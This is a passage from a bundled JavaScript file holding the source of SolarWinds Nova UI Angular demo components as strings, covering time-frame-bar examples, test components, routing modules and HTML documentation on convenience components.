pathMatch: "full",\n    },\n    {\n        path: "summary",\n        component: SummaryComponent,\n        data: {\n            srlc: {\n                stage: SrlcStage.beta,\n            },\n        },\n    },\n    {\n        path: "time-frame-bar",\n        loadChildren: async () =>\n            import(\n                "./time-frame-bar/time-frame-bar.module"\n            ) as object as Promise<Type<any>>,\n    },\n];\n\n@NgModule({\n    imports: [RouterModule.forChild(routes)],\n    declarations: [SummaryComponent],\n    providers: [\n        {\n            provide: DEMO_PATH_TOKEN,\n            useValue: getDemoFiles("convenience"),\n        },\n    ],\n    exports: [RouterModule],\n})\nexport default class ConvenienceModule {}\n'},61198:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nexport * from "./summary/summary.component";\nexport * from "./time-frame-bar/time-frame-bar-basic/time-frame-bar-basic.example.component";\nexport * from "./time-frame-bar/time-frame-bar-zoom/time-frame-bar-zoom.example.component";\nexport * from "./time-frame-bar/time-frame-bar-docs/time-frame-bar-docs.example.component";\nexport * from "./time-frame-bar/time-frame-bar-test/time-frame-bar-test.component";\n'},62312:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t="<h1>What is a convenience component?</h1>\n<p>\n    A convenience component is a composition of several bits components into a\n    larger component that's pre-configured/pre-implemented to accommodate the\n    majority of use cases within its problem set. In addition to reusability, a\n    convenience component is optimized for ease-of-use, meaning its internal\n    workings are hidden away and you shouldn't have to fuss too much to get it\n    working. The public interface is ideally as small as possible and relatively\n    straight-forward.\n</p>\n\n<h1>Sounds great! What's the catch?</h1>\n<p>\n    Well, there are a couple of things that could be considered drawbacks, but\n    hopefully the benefits, more often than not, outweigh any downsides.\n</p>\n<ol>\n    <li>\n        <p>\n            An easy-to-use, small interface comes at the cost of flexibility\n            which means, if you want a convenience component to do something out\n            of the ordinary, you may need to instead use the requisite bits\n            components to create your own custom version of the larger\n            component.\n        </p>\n\n        <p>\n            This relative lack of flexibility may be an insurmountable\n            inconvenience in some cases, but to mitigate at least some of the\n            reduction in flexibility, wherever it's practical, a convenience\n            component will provide projection slots to:\n        </p>\n\n        <ol type=\"a\">\n            <li>\n                Allow certain nested components to be optional or\n                interchangeable with other components\n            </li>\n            <li>Allow for a very limited amount of layout flexibility</li>\n        </ol>\n    </li>\n    <br />\n    <li>\n        A convenience component's interface is itself pretty rigid and resistant\n        to change to ensure that the internal overhead of maintaining the\n        component is minimized. So, adding features to a convenience component\n        is a rare occurrence, and this could be another reason you might need to\n        implement your own composition instead of using a convenience component.\n    </li>\n</ol>\n"},87928:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-convenience-summary",\n    templateUrl: "./summary.component.html",\n})\nexport class SummaryComponent {}\n'},47818:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-time-frame-bar\n    [minDate]="minDate"\n    [maxDate]="maxDate"\n    [(timeFrame)]="timeFrame"\n>\n    \x3c!-- content for default projection slot --\x3e\n    <nui-icon icon="calendar" class="pr-3"></nui-icon>\n    {{ timeFrame | timeFrame }}\n\n    \x3c!-- content for time frame selection projection slot --\x3e\n    <nui-quick-picker timeFrameSelection>\n        <nui-time-frame-picker></nui-time-frame-picker>\n    </nui-quick-picker>\n</nui-time-frame-bar>\n\n\x3c!-- FOR DEMO ONLY --\x3e\n<pre>{{ timeFrame | json }}</pre>\n'},55990:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, OnInit } from "@angular/core";\nimport moment, { Moment } from "moment/moment";\n\nimport { ITimeframe } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-convenience-time-frame-bar-basic-example",\n    templateUrl: "./time-frame-bar-basic.example.component.html",\n})\nexport class TimeFrameBarBasicExampleComponent implements OnInit {\n    public minDate: Moment;\n    public maxDate: Moment;\n    public timeFrame: ITimeframe;\n\n    private baseDate = moment([2018, 5, 1, 15, 0, 0]);\n\n    public ngOnInit(): void {\n        // Set the minimum and maximum selectable dates (optional)\n        this.minDate = this.baseDate.clone().subtract(1, "months");\n        this.maxDate = moment();\n\n        // Set the initial time frame\n        this.timeFrame = {\n            startDatetime: this.baseDate.clone().subtract(1, "weeks"),\n            endDatetime: this.baseDate.clone(),\n        };\n    }\n}\n'},36368:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<h1>Time Frame Bar</h1>\n<p>\n    The\n    <code\n        ><a href="../components/TimeFrameBarComponent.html" target="_blank"\n            >nui-time-frame-bar</a\n        ></code\n    >\n    is a\n    <a\n        href="../additional-documentation/convenience-components.html"\n        target="_parent"\n    >\n        <strong>convenience component</strong>\n    </a>\n    designed to simplify adding time frame selection to your view. It provides\n    the following:\n</p>\n<ol>\n    <li>Buttons to sequentially select an earlier or later time frame</li>\n    <li>A projection slot for the time frame display value</li>\n    <li>A projection slot for a popover time frame picker</li>\n</ol>\n<h2>Required Modules</h2>\n<ul>\n    <li>\n        <code>NuiTimeFrameBarModule</code>\n    </li>\n    <li>\n        <code>NuiTimeFramePickerModule</code>\n    </li>\n</ul>\n\n<h2>Basic Usage</h2>\n<p>\n    The time frame bar defines a couple of projection slots that enable its\n    basic functionality while maintaining some flexibility:\n</p>\n<ol>\n    <li>\n        The default projection slot serves as the popover trigger and typically\n        contains the time frame\'s display value.\n    </li>\n    <li>\n        The time frame selection slot takes an element tagged with the\n        <code>timeFrameSelection</code>\n        attribute and provides the user with the ability to select a specific\n        time frame. Supported content for this slot is the\n        <code\n            ><a\n                href="../components/TimeFramePickerComponent.html"\n                target="_blank"\n                >nui-time-frame-picker</a\n            ></code\n        >\n        which can be optionally wrapped with a\n        <code\n            ><a href="../components/QuickPickerComponent.html" target="_blank"\n                >nui-quick-picker</a\n            ></code\n        >\n        element.\n    </li>\n</ol>\n<nui-message type="warning" [allowDismiss]="false">\n    <strong>Note:</strong> Any values set on the <code>minDate</code>,\n    <code>maxDate</code>, and <code>startModel</code> inputs of the projected\n    <code>nui-time-frame-picker</code> will be ignored. So, be sure to use the\n    minDate, maxDate, and timeFrame inputs respectively on the\n    <code>nui-time-frame-bar</code> instead.\n</nui-message>\n<p>\n    An additional projection slot (not shown in the example) is available for\n    projecting secondary template content on the right side of the bar. To use\n    this slot, tag the element to be projected with the\n    <code>rightContent</code> attribute.\n</p>\n<p>\n    Take a look at the source of the following example to see how easy it can be\n    to use the\n    <code>nui-time-frame-bar</code>.\n</p>\n<nui-example-wrapper\n    filenamePrefix="time-frame-bar-basic"\n    exampleTitle="Basic Usage"\n>\n    <nui-convenience-time-frame-bar-basic-example></nui-convenience-time-frame-bar-basic-example>\n</nui-example-wrapper>\n\n<h2>Adding Zoom Functionality</h2>\n<p>\n    Adding the ability to zoom may be desired if the\n    <code>nui-time-frame-bar</code> is used in conjunction with a time-based\n    chart. Take a look at the source of the following example to see how easy it\n    is to add zooming to a <code>nui-time-frame-bar</code>.\n</p>\n<nui-example-wrapper\n    filenamePrefix="time-frame-bar-zoom"\n    exampleTitle="Adding Zoom Functionality"\n>\n    <nui-convenience-time-frame-bar-zoom-example></nui-convenience-time-frame-bar-zoom-example>\n</nui-example-wrapper>\n<p>\n    As you can see in the source code of the example above, keeping track of the\n    zoom step history lets the user zoom in and out incrementally using the same\n    time frames in each direction. This can be done using an instance of the\n    <code\n        ><a href="../injectables/HistoryStorage.html" target="_blank"\n            >HistoryStorage</a\n        ></code\n    >\n    class.\n</p>\n<p>\n    Also note in the example template that a separate handler,\n    <code>onChange</code>, is assigned to the\n    <code>timeFrameChange</code> output instead of using the "banana-in-a-box"\n    notation on the <code>timeFrame</code> attribute. This is done to allow a\n    restart of the zoom history whenever a time frame change originates from\n    within the TimeFrameBarComponent.\n</p>\n'},77328:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-time-frame-bar-docs-example",\n    templateUrl: "./time-frame-bar-docs.example.component.html",\n})\nexport class TimeFrameBarDocsExampleComponent {}\n'},64200:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="nui-time-frame-bar-test">\n    <nui-time-frame-bar\n        [minDate]="fromDate"\n        [maxDate]="toDate"\n        [timeFrame]="timeFrame"\n        (timeFrameChange)="onChange($event)"\n        (undo)="timeFrame = history.undo()"\n        (clear)="onChange()"\n        [historyIndex]="history.index"\n    >\n        <nui-icon icon="calendar" class="pr-3"></nui-icon>\n        {{ timeFrame | timeFrame }}\n        <nui-quick-picker timeFrameSelection>\n            <nui-time-frame-picker></nui-time-frame-picker>\n        </nui-quick-picker>\n    </nui-time-frame-bar>\n    <button class="btn-zoom-in" (click)="zoomIn()">Zoom In</button>\n    <button class="btn-set-default" (click)="resetDefault()">\n        Set Default TimeFrame\n    </button>\n</div>\n'},85976:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\nimport moment from "moment/moment";\n\nimport { HistoryStorage, ITimeframe } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-convenience-time-frame-bar-test",\n    templateUrl: "./time-frame-bar-test.component.html",\n    providers: [HistoryStorage],\n})\nexport class TimeFrameBarTestComponent {\n    private baseDate = moment([2018, 5, 1, 15, 0, 0]);\n    public fromDate = this.baseDate.clone().subtract(1, "month");\n    public toDate = moment([2050]);\n    public timeFrame: ITimeframe;\n\n    constructor(public history: HistoryStorage<ITimeframe>) {\n        this.resetDefault();\n    }\n\n    public onChange(value?: ITimeframe): void {\n        this.timeFrame = this.history.restart(value);\n    }\n\n    public zoomIn(): void {\n        this.timeFrame = this.history.save({\n            startDatetime: this.timeFrame.startDatetime.clone().add(1, "day"),\n            endDatetime: this.timeFrame.endDatetime.clone().subtract(1, "day"),\n        });\n    }\n\n    public resetDefault(): void {\n        this.onChange({\n            startDatetime: this.baseDate.clone().subtract(1, "week"),\n            endDatetime: this.baseDate.clone(),\n        });\n    }\n}\n'},96520:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-time-frame-bar\n    [id]="bar.id"\n    *ngFor="let bar of bars"\n    [timeFrame]="bar.timeFrame"\n    (timeFrameChange)="changeTimeFrame($event, bar)"\n    (undo)="bar.undo()"\n    (clear)="bar.change()"\n    [historyIndex]="bar.history.index"\n>\n    <nui-icon icon="calendar" class="pr-3"></nui-icon>\n    {{ bar.timeFrame | timeFrame }}\n    <nui-quick-picker timeFrameSelection>\n        <nui-time-frame-picker></nui-time-frame-picker>\n    </nui-quick-picker>\n</nui-time-frame-bar>\n\n<nui-time-frame-bar\n    [id]="barNoQuickPick.id"\n    [(timeFrame)]="barNoQuickPick.timeFrame"\n>\n    <nui-icon icon="calendar" class="pr-3"></nui-icon>\n    {{ barNoQuickPick.timeFrame | timeFrame }}\n    <nui-time-frame-picker timeFrameSelection></nui-time-frame-picker>\n</nui-time-frame-bar>\n'},59288:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, OnInit } from "@angular/core";\nimport moment from "moment/moment";\n\nimport { HistoryStorage, ITimeframe, TimeframeService } from "@nova-ui/bits";\n\nclass TestBar {\n    private _baseDate = moment([2018, 5, 1, 15, 0, 0]);\n    public get baseDate() {\n        return this._baseDate;\n    }\n    public timeFrame: ITimeframe = this.getDefaultTF();\n    public history = new HistoryStorage<ITimeframe>();\n\n    constructor(public id: string) {\n        this.history.restart(this.timeFrame);\n    }\n\n    public zoomIn = (value: ITimeframe) =>\n        (this.timeFrame = this.history.save(value));\n    public undo = () => (this.timeFrame = this.history.undo());\n    public change = (value?: ITimeframe) =>\n        (this.timeFrame = this.history.restart(value));\n\n    private getDefaultTF(): ITimeframe {\n        return {\n            startDatetime: this._baseDate.clone().subtract(1, "week"),\n            endDatetime: this._baseDate.clone(),\n        };\n    }\n}\n\n@Component({\n    selector: "nui-convenience-time-frame-bar-visual-test",\n    templateUrl: "./time-frame-bar-visual.component.html",\n})\nexport class TimeFrameBarVisualTestComponent implements OnInit {\n    public bars: TestBar[] = ["first", "second", "third"].map(\n        (id) => new TestBar(id)\n    );\n    public barNoQuickPick = new TestBar("bar-no-quick-pick");\n\n    constructor(private timeframeService: TimeframeService) {}\n\n    public ngOnInit(): void {\n        setTimeout(() => {\n            // No zoom on bar[0]\n            this.zoomBar(this.bars[1]);\n            this.zoomBar(this.bars[2]);\n            this.zoomBar(this.bars[2]);\n        });\n    }\n\n    public zoomBar(bar: TestBar): void {\n        bar.zoomIn(this.zoomTF(bar.timeFrame));\n    }\n\n    public zoomTF(timeFrame: ITimeframe): ITimeframe {\n        return {\n            startDatetime: timeFrame.startDatetime.clone().add(1, "day"),\n            endDatetime: timeFrame.endDatetime.clone().subtract(1, "day"),\n        };\n    }\n\n    public changeTimeFrame(value: ITimeframe, bar: TestBar): void {\n        const tf = this.timeframeService.reconcileTimeframe(\n            value,\n            undefined,\n            bar.baseDate\n        );\n        bar.change(tf);\n    }\n}\n'},97168:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-time-frame-bar\n    [minDate]="minDate"\n    [maxDate]="maxDate"\n    [timeFrame]="timeFrame"\n    (timeFrameChange)="onChange($event)"\n    [historyIndex]="history.index"\n    (undo)="onUndo()"\n    (clear)="onChange()"\n>\n    \x3c!-- content for default projection slot --\x3e\n    <nui-icon icon="calendar" class="pr-3"></nui-icon>\n    {{ timeFrame | timeFrame }}\n\n    \x3c!-- content for time frame selection projection slot --\x3e\n    <nui-quick-picker timeFrameSelection>\n        <nui-time-frame-picker></nui-time-frame-picker>\n    </nui-quick-picker>\n</nui-time-frame-bar>\n\n\x3c!-- FOR DEMO ONLY --\x3e\n<pre>{{ timeFrame | json }}</pre>\n<button\n    nui-button\n    type="button"\n    icon="zoom-in"\n    displayStyle="primary"\n    (click)="onZoomIn()"\n    [disabled]="!canZoom()"\n>\n    Zoom In\n</button>\n'},23408:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, OnInit } from "@angular/core";\nimport moment, { DurationInputArg2, Moment } from "moment/moment";\n\nimport { HistoryStorage, ITimeframe } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-convenience-time-frame-bar-zoom-example",\n    templateUrl: "./time-frame-bar-zoom.example.component.html",\n    providers: [HistoryStorage],\n})\nexport class TimeFrameBarZoomExampleComponent implements OnInit {\n    public minDate: Moment;\n    public maxDate: Moment;\n\n    public timeFrame: ITimeframe;\n\n    private baseDate = moment([2018, 5, 1, 15, 0, 0]);\n    private zoomLevels: DurationInputArg2[] = [\n        "weeks",\n        "days",\n        "hours",\n        "minutes",\n    ];\n\n    // Inject an instance of HistoryStorage\n    constructor(public history: HistoryStorage<ITimeframe>) {}\n\n    public ngOnInit(): void {\n        // Set the minimum and maximum selectable dates\n        this.minDate = this.baseDate.clone().subtract(1, "months");\n        this.maxDate = moment();\n\n        // Set the initial time frame\n        this.onChange(this.getTimeFrame(this.zoomLevels[0]));\n    }\n\n    // Save the new timeframe to the history storage and set it as the current timeFrame\n    public onZoomIn = (): void => {\n        this.timeFrame = this.history.save(\n            this.getTimeFrame(this.zoomLevels[this.history.index + 1])\n        );\n    };\n\n    // Use the history storage to go back one time frame\n    public onUndo = (): void => {\n        this.timeFrame = this.history.undo();\n    };\n\n    // Reset the history storage and save a new initial value if provided\n    // Otherwise preserve the previous one\n    public onChange = (value?: ITimeframe): void => {\n        this.timeFrame = this.history.restart(value);\n    };\n\n    // This method is for demo purposes only\n    public canZoom(): boolean {\n        const expectedTF = this.getTimeFrame(\n            this.zoomLevels[this.history.index]\n        );\n        const matchesZoomLevel =\n            this.timeFrame.startDatetime.isSame(expectedTF.startDatetime) &&\n            this.timeFrame.endDatetime.isSame(expectedTF.endDatetime);\n        return (\n            matchesZoomLevel && this.history.index < this.zoomLevels.length - 1\n        );\n    }\n\n    // This method is for demo purposes only\n    private getTimeFrame(zoomLevel: DurationInputArg2): ITimeframe {\n        return {\n            startDatetime: this.baseDate.clone().subtract(1, zoomLevel),\n            endDatetime: this.baseDate.clone().add(1, zoomLevel),\n        };\n    }\n}\n'},23875:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { NgModule } from "@angular/core";\nimport { RouterModule } from "@angular/router";\n\nimport {\n    NuiButtonModule,\n    NuiCommonModule,\n    NuiDatePickerModule,\n    NuiDialogModule,\n    NuiDocsModule,\n    NuiIconModule,\n    NuiMessageModule,\n    NuiPopoverModule,\n    NuiTimeFrameBarModule,\n    NuiTimeFramePickerModule,\n    NuiTimePickerModule,\n    NuiTooltipModule,\n    SrlcStage,\n} from "@nova-ui/bits";\n\nimport { TimeFrameBarBasicExampleComponent } from "./time-frame-bar-basic/time-frame-bar-basic.example.component";\nimport { TimeFrameBarDocsExampleComponent } from "./time-frame-bar-docs/time-frame-bar-docs.example.component";\nimport { TimeFrameBarTestComponent } from "./time-frame-bar-test/time-frame-bar-test.component";\nimport { TimeFrameBarVisualTestComponent } from "./time-frame-bar-visual/time-frame-bar-visual.component";\nimport { TimeFrameBarZoomExampleComponent } from "./time-frame-bar-zoom/time-frame-bar-zoom.example.component";\n\nconst routes = [\n    {\n        path: "",\n        component: TimeFrameBarDocsExampleComponent,\n        data: {\n            srlc: {\n                stage: SrlcStage.beta,\n            },\n            showThemeSwitcher: true,\n        },\n    },\n    {\n        path: "basic",\n        component: TimeFrameBarBasicExampleComponent,\n    },\n    {\n        path: "zoom",\n        component: TimeFrameBarZoomExampleComponent,\n    },\n    {\n        path: "test",\n        component: TimeFrameBarTestComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n    {\n        path: "visual",\n        component: TimeFrameBarVisualTestComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n];\n\n@NgModule({\n    imports: [\n        NuiButtonModule,\n        NuiCommonModule,\n        NuiDatePickerModule,\n        NuiDialogModule,\n        NuiIconModule,\n        NuiDocsModule,\n        NuiMessageModule,\n        NuiPopoverModule,\n        NuiTimeFramePickerModule,\n        NuiTimePickerModule,\n        NuiTooltipModule,\n        NuiTimeFrameBarModule,\n        RouterModule.forChild(routes),\n    ],\n    declarations: [\n        TimeFrameBarBasicExampleComponent,\n        TimeFrameBarZoomExampleComponent,\n        TimeFrameBarDocsExampleComponent,\n        TimeFrameBarTestComponent,\n        TimeFrameBarVisualTestComponent,\n    ],\n    exports: [RouterModule],\n})\nexport default class TimeFrameBarModule {}\n'},11062:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t="<nui-date-picker></nui-date-picker>\n"},49186:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-date-picker-basic-example",\n    templateUrl: "./date-picker-basic.example.component.html",\n})\nexport class DatePickerBasicExampleComponent {}\n'},13164:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<p>\n    Press the calendar navigation arrows to trigger the\n    <code>calendarNavigated</code> event\n</p>\n<p>\n    Navigated to date: <strong>{{ calendarChangedDate }}</strong>\n</p>\n<nui-date-picker\n    id="nui-demo-datepicker-value-change"\n    [inline]="true"\n    (calendarNavigated)="dateChanged($event)"\n>\n</nui-date-picker>\n'},24604:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files 